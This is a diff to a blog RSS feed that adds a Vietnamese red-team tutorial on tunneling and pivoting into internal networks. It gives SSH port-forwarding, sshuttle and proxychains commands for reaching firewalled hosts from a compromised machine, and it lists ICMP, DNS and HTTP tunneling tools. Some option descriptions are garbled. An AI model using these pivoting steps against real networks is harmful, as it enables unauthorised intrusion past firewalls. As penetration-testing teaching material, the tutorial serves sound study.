@@ -6,8 +6,254 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 28 Jul 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Fri, 30 Jul 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Tunneling, Pivoting to Attack Internal Network</title>
+            <link>https://tranquac.github.io/posts/2021/07/tunneling-pivoting-to-attack-internal-network/</link>
+            <pubDate>Fri, 30 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://tranquac.github.io/posts/2021/07/tunneling-pivoting-to-attack-internal-network/</guid>
+            <description>Giới thiệu Các công cụ phổ biến tạo tunnel  SSH Tunnel  Local Port Porwarding Remote Port Porwarding Dynamic Port Porwarding Sshuttle   Netword Layer Tunnel Transport Layer Tunnel Application Layer Tunnel   Create SOCKS Proxy to Attack Internal Network Đọc thêm  Intro   Có rất nhiều bài viêt,blog về việc tấn công,xâm nhập mạng nội bộ trên Internet, nhưng hầu hết trong số chúng tập trung vào việc sử dụng các công cụ, và các nguyên tắc, tình huống ít được đề cập,giải thích nhiều.</description>
+            <content type="html"><![CDATA[<ul>
+<li><a href="#Intro">Giới thiệu</a></li>
+<li><a href="#cac-cong-cu-pho-bien-tao-tunnel">Các công cụ phổ biến tạo tunnel</a>
+<ul>
+<li><a href="#ssh-tunnel">SSH Tunnel</a>
+<ul>
+<li><a href="#local-port-forwarding">Local Port Porwarding</a></li>
+<li><a href="#remote-port-forwarding">Remote Port Porwarding</a></li>
+<li><a href="#dynamic-port-forwarding">Dynamic Port Porwarding</a></li>
+<li><a href="#sshuttle">Sshuttle</a></li>
+</ul>
+</li>
+<li><a href="#netword-layer-tunnel">Netword Layer Tunnel</a></li>
+<li><a href="#transport-layer-tunnel">Transport Layer Tunnel</a></li>
+<li><a href="#application-layer-tunnel">Application Layer Tunnel</a></li>
+</ul>
+</li>
+<li><a href="#create-socks-proxy-to-attack-internal-network">Create SOCKS Proxy to Attack Internal Network</a></li>
+<li><a href="#refer">Đọc thêm</a></li>
+</ul>
+<h2 id="intro">Intro</h2>
+<ul>
+<li>
+<p>Có rất nhiều bài viêt,blog về việc tấn công,xâm nhập mạng nội bộ trên Internet, nhưng hầu hết trong số chúng tập trung vào việc sử dụng các công cụ, và các nguyên tắc, tình huống ít được đề cập,giải thích nhiều. Bài viết này tôi sẽ thảo luận về nguyên tắc tấn công mạng nội bộ đa rạng, và thiết kế linh hoạt sơ đồ tấn công mạng nội bộ tương ứng theo các tình huống của mạng nội bộ khác nhau. Đây cũng là một trong những chủ đề tôi yêu thích nhất trong an ninh mạng và hoạt động của red team nói chung.</p>
+</li>
+<li>
+<p>Tấn công,xâm nhập mạng nội bộ là: sử dụng các công nghệ tunnel khác nhau để vượt qua sự phong tỏa, phát hiện của tường lửa với các giao thức được tường lửa cho phép để đạt được quyền truy cập vào mạng mục tiêu bị chặn.</p>
+</li>
+<li>
+<p>Công nghệ tunnel (đường hầm) là một cách để truyền dữ liệu giữa các mạng bằng cách sử dụng cơ sở hạ tầng của Internet. Dữ liệu được truyền bằng tunnel có thể là các frame dữ liệu hoặc các package của các protocol khác nhau. Tunnel protocol đóng gói lại các frame dữ liệu hoặc package dữ liệu của các protocol khác này trong một header mới để truyền. Header mới cung cấp thông tin định tuyến để dữ liệu được đóng gói có thể được truyền qua Internet. Các package dữ liệu đóng gói được định tuyến giữa hai endpoint của tunnel thông qua mạng internet. Đường dẫn logic mà package dữ liệu đã đóng gói được truyền qua Internet được gọi là tunnel. Khi kết thúc, dữ liệu sẽ được giải nén và chuyển tiếp đến đích cuối cùng. Lưu ý rằng công nghệ tunnel đề cập đến toàn bộ quá trình bao gồm đóng gói, truyền và giải nén dữ liệu.</p>
+</li>
+<li>
+<p>Các công nghệ tunnel mà chúng tôi thường sử dụng để xâm nhập mạng nội bộ bao gồm dns tunnel, http tunnel, ssh tunnel, icmp (ping) tunnel và các giao thức khác mà tường lửa cho phép.</p>
+</li>
+<li>
+<p>Các công nghệ tunnel này có thể được phân lớp theo lớp giao thức:</p>
+<ul>
+<li>Netword layer tunnel: ICMP tunnel, v.v.</li>
+<li>Transport layer tunnel: TCP tunnel, UDP tunnel</li>
+<li>Application layer tunnel: HTTP, DNS, SSH và các tunnel khác</li>
+</ul>
+</li>
+</ul>
+<h2 id="cac-cong-cu-pho-bien-tao-tunnel">Cac cong cu pho bien tao tunnel</h2>
+<h3 id="ssh-tunnel">SSH Tunnel</h3>
+<ul>
+<li>Vì đây là một phần quan trọng và sử dụng cực kì hữu ích trong thực tế nên tôi sẽ nói kĩ về nó. Nó nằm trong Application layer tunnel.</li>
+</ul>
+<h4 id="local-port-forwarding">Local Port Forwarding</h4>
+<p><code>ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT</code>
+-&gt; Tất cả traffic đến [LOCAL_IP:]LOCAL_PORT sẽ được forward đến DESTINATION:DESTINATION_PORT qua ssh tunnel<br>
+<code>ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT -L [LOCAL_IP2:]LOCAL_PORT2:DESTINATION2:DESTINATION_PORT2</code><br>
+-&gt; Multi local port forwarding<br>
+<code>ssh user@10.66.66.4 -CNfg -L 13389:127.0.0.1:3389</code><br>
+-&gt; Tất cả traffic đến 13389 trên localhost sẽ được forward tới 127.0.0.1:3389 trên server<br>
+<code>ssh user@10.66.66.4 -CNfg -L 13389:10.9.9.123:3389</code><br>
+-&gt; Tất cả traffic đến 13389 trên localhost sẽ được forward tới 10.9.9.123:3389 nếu từ server có thể kết nối đến 10.9.9.123:3389<br>
+<code>ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389</code><br>
+-&gt; Có thể forward port ssh từ local lên server public (remote port forwarding) để tất cả mọi người từ bên ngoài đều có thể kết nối được đến 10.9.9.123:3389 (mạng local)<br>
+<code>ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389 -L 13390:10.9.9.123:3390 -L 13391:10.9.9.123:3391</code><br>
+-&gt; Ví dụ multi local port forwarding<br>
+<strong>Local port forwarding thường được sử dụng để kéo một port từ server hoặc trong vùng mạng với server -&gt; local</strong></p>
+<p><strong>Ví dụ thực tế</strong></p>
+<ul>
+<li>Kịch bản:<br>
+    [KALI]    &lt;===&gt;    [Debian]    &lt;===&gt;    [Windows Server]<br>
+10.10.10.10        192.168.10.10                172.16.10.10<br>
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;X&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt;   tcp/445<br>
+                                &mdash;&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&gt;   tcp/445<br>
+&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt; tcp/22</li>
+<li>Trong trường hợp này : Khi ta khai thác và chiếm quyền kiểm soát được máy chủ 192.168.10.10 của mục tiêu. 172.16.10.10 là một máy chủ nội bộ, không có kết nối internet và không thể kết nối đến mạng bên ngoài. Giả sử nó đang mở port 445. Vậy làm sao có thể khai thác và enum thông tin của nó từ máy của chúng ta?</li>
+<li>From KALI : <code>ssh -N -L 0.0.0.0:4445:172.16.10.10:445 root@192.168.10.10</code></li>
+<li>Sau khi sử dụng lệnh này trên máy KALI chúng ta có thể truy cập 172.16.10.10:445 từ <code>localhost:445</code></li>
+</ul>
+<h4 id="remote-port-forwarding">Remote Port Forwarding</h4>
+<p><code>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER</code><br>
+-&gt; Tất cả traffic đến [REMOTE:]REMOTE_PORT trên server sẽ forward đến DESTINATION:DESTINATION_PORT (client)<br>
+<code>ssh user@remote.host -CNfg -R 8080:127.0.0.1:3000</code><br>
+-&gt; Tất cả traffic đến port 8080 trên server sẽ được forward đến 127.0.0.1:3000 trên máy của bạn<br>
+<code>ssh -tt -R 3389:localhost:3389 root@103.81.86.132 -p 9020 ssh -L 103.81.86.132:3389:127.0.0.1:3389 root@localhost -p 9020</code><br>
+-&gt; Ví dụ bạn có một server public. Bạn có thể sử dụng lệnh này để kéo port 3389 từ local lên server để mọi người từ internet có thể kết nối đến (trong trường hợp này là remote desktop). Vì remote port fowarding mặc định chỉ foward đến interface 127.0.0.1 nên tả sẽ sử dụng thêm một lệnh local port fowarding nữa để chuyển traffic qua interface public.<br>
+<strong>Remote port forwarding thường được sử dụng để kéo 1 port từ local hoặc trong vùng mạng của local -&gt; server</strong>
+<strong>Ví dụ thực tế</strong></p>
+<ul>
+<li>Kịch bản:<br>
+     [KALI]                        [Debian]            <br>
+103.81.86.132              172.16.10.10   <br>
+                                 (Compromised)<br>
+        &mdash;&mdash;&mdash;-X&mdash;&mdash;&mdash;-&gt; tcp/22<br>
+        &mdash;&mdash;&mdash;-X&mdash;&mdash;&mdash;-&gt; tcp/3306<br>
+      ANY &lt;&mdash;&mdash;V&mdash;&mdash;&mdash;&mdash;&ndash;</li>
+<li>From Debian : <code>ssh -N -R 103.81.86.132:2221:127.0.0.1:3306 kali@10.10.10.10</code></li>
+<li>Bây giờ trên Kali, khi traffic đến tcp / 2221, nó sẽ chuyển đến tcp / 3306 của Debian</li>
+</ul>
+<h4 id="dynamic-port-forwarding">Dynamic Port Forwarding</h4>
+<p><code>ssh -D [LOCAL_IP:]LOCAL_PORT [USER@]SSH_SERVER</code><br>
+<code>ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</code><br>
+-&gt; Lúc này 127.0.0.1:7777 sẽ đóng vai trò như một SOCKS proxy forward mọi traffic qua nó đến vùng mạng của server<br>
+<strong>Dymanic port forwarding được sử dụng để tạo SOCKS proxy để truy cập mọi IP, port trên mạng server qua SOCKs proxy</strong>
+<strong>Ví dụ thực tế</strong></p>
+<ul>
+<li>Kịch bản:<br>
+   [KALI]      &lt;===&gt;      [Debian]      &lt;===&gt;      [Windows Server]<br>
+10.10.10.10            192.168.10.10                  172.16.10.10<br>
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-X&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt;   tcp/445<br>
+                                           &mdash;&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&gt;   tcp/445<br>
+                                           &mdash;&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&gt;   tcp/any<br>
+&mdash;&mdash;&mdash;&ndash;V&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&gt; tcp/22</li>
+<li>From Kali: <code>ssh -N -D 127.0.0.1:8080 user@192.168.10.10</code></li>
+<li>Lúc này 127.0.0.1:8080 đóng vai trò như một SOCKS proxy forward toàn bộ traffic đi qua nó tới vùng mạng mà 192.168.10.10 có thể kết nối đến.</li>
+<li>Nếu là http traffic có thể sử dụng FoxyProxy, traffic khác có thể sử dụng proxychains</li>
+<li>Cấu hình /etc/proxychains.conf:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...
+socks4 127.0.0.1 <span style="color:#ae81ff">8080</span>
+</code></pre></div><ul>
+<li>Scan nmap qua proxychains: <code>proxychains --top-ports -sT -Pn 172.16.10.10</code></li>
+</ul>
+<h4 id="options">Options</h4>
+<p>-C Requests compression of all data (including stdin, stdout, stderr, and data for forwarded X11 and TCP connections)<br>
+-N Do not execute a remote command. This is useful for just forwarding ports<br>
+-g Allows remote hosts to connect to local forwarded ports.<br>
+-L Local port forwarding<br>
+-R Local port forwarding<br>
+-D Local port forwarding (SOCKS proxy)<br>
+-p port</p>
+<h4 id="sshuttle">Sshuttle</h4>
+<ul>
+<li>Một công cụ rất hay chúng ta cũng có thể sử dụng là sshuttle (<a href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a>)</li>
+<li>Install
+<ul>
+<li>Debian    : <code>apt-get install sshuttle -y</code></li>
+<li>Rpm-based : <code>yum install sshuttle</code></li>
+</ul>
+</li>
+<li>Usage
+<ul>
+<li><code>sshuttle -r USERNAME@SERVER_IP 0.0.0.0/0 -vv</code> (mọi kết nối sẽ đi qua server)</li>
+<li><code>sshuttle -r sean@10.11.1.251 10.1.1.27</code> (tạo kết nối trực tiếp đến 10.1.1.27 thông qua trung gian 10.11.1.251)</li>
+<li><code>sshuttle -r sean@10.11.1.251 10.1.1.27/24</code> (tạo kết nối trực tiếp đến 10.1.1.27/24 thông qua trung gian 10.11.1.251)\</li>
+<li><code>nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.27/24</code>(có thể sử dụng nmap scan trực tiếp không cần qua proxy như ssh dynamic port fowarding)</li>
+</ul>
+</li>
+</ul>
+<h4 id="chú-ý">Chú ý</h4>
+<ul>
+<li>Trong thực tế giả sử bạn có quyền truy cập máy chủ thông qua một lỗ hổng web hay ứng dụng, chúng ta không có thông tin đăng nhập của ssh. Bạn hoàn toàn có thể tạo một cặp key từ máy chủ và có thể ssh qua private key của nó với options <code>-i</code> như phần đầu tiên trong bài viết này của tôi :<br>
+<a href="https://tranquac.com/posts/2021/06/linux-backdoors/">https://tranquac.com/posts/2021/06/linux-backdoors/</a></li>
+</ul>
+<h3 id="netword-layer-tunnel">Netword Layer Tunnel</h3>
+<ul>
+<li>Tôi sẽ giới thiệu một số công cụ các bạn có thể tự nghiên cứu và thực hành</li>
+<li>ICMP tunnel:
+<ul>
+<li>icmpsh (<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a>)</li>
+<li>icmptunnel (<a href="https://github.com/DhavalKapil/icmptunnel">https://github.com/DhavalKapil/icmptunnel</a>)</li>
+<li>pingtunnel (<a href="https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/">https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/</a>)</li>
+</ul>
+</li>
+</ul>
+<h3 id="transport-layer-tunnel">Transport Layer Tunnel</h3>
+<ul>
+<li>TCP tunnel, UDP tunnel:
+<ul>
+<li>netcat</li>
+<li>powercat</li>
+<li>socat</li>
+<li>netsh</li>
+<li>lcx</li>
+<li>NATBypass</li>
+<li>iox</li>
+</ul>
+</li>
+</ul>
+<h3 id="application-layer-tunnel">Application Layer Tunnel</h3>
+<ul>
+<li>HTTP, DNS, SSH và các tunnel khác. SSH tôi đã nói rất chi tiết ở trên.
+<ul>
+<li>dnscat2</li>
+<li>dnscat2-powershell</li>
+<li>dns2tcp</li>
+<li>iodine</li>
+<li>reGeorg</li>
+<li>Neo-reGeorg</li>
+<li>reDuh</li>
+<li>Tunna</li>
+<li>ABPTTS</li>
+<li>EarthWorm</li>
+<li>Termite</li>
+<li>Venom</li>
+<li>ssocks</li>
+<li>s5.go</li>
+</ul>
+</li>
+</ul>
+<h2 id="create-socks-proxy-to-attack-internal-network">Create SOCKS Proxy to Attack Internal Network</h2>
+<h3 id="ssh">Ssh</h3>
+<ul>
+<li><a href="#dynamic-port-forwarding">Dynamic Port Porwarding</a></li>
+<li><a href="#sshuttle">Sshuttle</a></li>
+</ul>
+<h3 id="powershell">Powershell</h3>
+<ul>
+<li><a href="https://www.varonis.com/blog/nmap-reverse-proxies/">https://www.varonis.com/blog/nmap-reverse-proxies/</a></li>
+<li><a href="https://tokyoneon.github.io/">https://tokyoneon.github.io/</a></li>
+<li><a href="https://github.com/tokyoneon/Invoke-SocksProxy">https://github.com/tokyoneon/Invoke-SocksProxy</a></li>
+</ul>
+<h3 id="rdp">RDP</h3>
+<ol>
+<li><strong>Client</strong>: Register the <code>UDVC-Plugin.dll</code> on the system (<a href="https://github.com/earthquake/UniversalDVC#installation">https://github.com/earthquake/UniversalDVC#installation</a>)</li>
+<li><strong>Client</strong>: connect via <code>RDP</code> to the server (by default it will create the virtual channel on all RDP connections, by binding the TCP port 31337)</li>
+<li>Copy <code>UDVC-Server.exe</code> and the <code>SSF package</code> on the remote server</li>
+<li><strong>Server</strong>: execute <code>ssfd.exe -p 9898</code></li>
+<li><strong>Server</strong>: execute <code>UDVC-Server.exe -c -p 9898 -i 127.0.0.1</code></li>
+<li><strong>Client</strong>: execute <code>ssf.exe -D 9999 -p 31337 127.0.0.1</code><br>
+-&gt; At this point you will have the socks server listening on port 9999 of your client.</li>
+</ol>
+<h3 id="http">HTTP</h3>
+<ul>
+<li><a href="https://blog.csdn.net/qq_34801745/article/details/108896857">https://blog.csdn.net/qq_34801745/article/details/108896857</a></li>
+</ul>
+<h3 id="dns">DNS</h3>
+<ul>
+<li><a href="http://blog.dengxj.com/archives/14/">http://blog.dengxj.com/archives/14/</a></li>
+</ul>
+<h3 id="icmp">ICMP</h3>
+<ul>
+<li><a href="https://blog.csdn.net/qq_34801745/article/details/108896857">https://blog.csdn.net/qq_34801745/article/details/108896857</a></li>
+</ul>
+<h2 id="refer">Refer</h2>
+<ul>
+<li><a href="https://blog.csdn.net/qq_34801745/article/details/108896857">https://blog.csdn.net/qq_34801745/article/details/108896857</a></li>
+<li><a href="https://blog.csdn.net/qq_34801745/article/details/109022922">https://blog.csdn.net/qq_34801745/article/details/109022922</a></li>
+<li><a href="https://www.ms509.com/2020/06/17/Intranet-penetration/">https://www.ms509.com/2020/06/17/Intranet-penetration/</a></li>
+<li><a href="https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/">https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/</a></li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>JWT Attack</title>
